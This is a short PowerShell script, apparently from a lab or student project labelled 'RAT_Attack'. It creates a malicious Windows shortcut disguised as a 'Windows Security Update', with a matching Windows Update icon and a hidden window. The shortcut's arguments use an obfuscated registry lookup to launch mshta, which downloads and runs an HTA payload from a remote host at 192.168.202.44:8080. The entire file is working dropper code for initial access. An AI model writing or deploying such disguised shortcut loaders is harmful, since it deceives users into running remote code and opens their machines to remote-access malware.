# PowerShell Script to Create Malicious LNK File
# Creates a shortcut that downloads and executes HTA file

$WshShell = New-Object -ComObject WScript.Shell

# LNK 파일 경로
$LnkPath = "D:\GithubProject\hyundai_project4\RAT_Attack\WindowsUpdate.lnk"

# Shortcut 생성
$Shortcut = $WshShell.CreateShortcut($LnkPath)

# Target: PowerShell
$Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"

# Arguments: HTA 다운로드 및 실행
$Shortcut.Arguments = '-W Hidden -NoP -C ".(gp ''HKLM:\SOF*\Clas*\App*\m*e'').PSChildName http://192.168.202.44:8080/test.hta"'

# Working Directory
$Shortcut.WorkingDirectory = "%TEMP%"

# Window Style (7 = Hidden)
$Shortcut.WindowStyle = 7

# Icon (Windows Update 아이콘)
$Shortcut.IconLocation = "shell32.dll,47"

# Description
$Shortcut.Description = "Windows Security Update"

# Save
$Shortcut.Save()

Write-Host "[+] LNK file created: $LnkPath" -ForegroundColor Green

# 검증
if (Test-Path $LnkPath) {
    Write-Host "[+] File exists!" -ForegroundColor Green
    Get-Item $LnkPath | Select-Object Name, Length, LastWriteTime
} else {
    Write-Host "[-] Failed to create LNK" -ForegroundColor Red
}
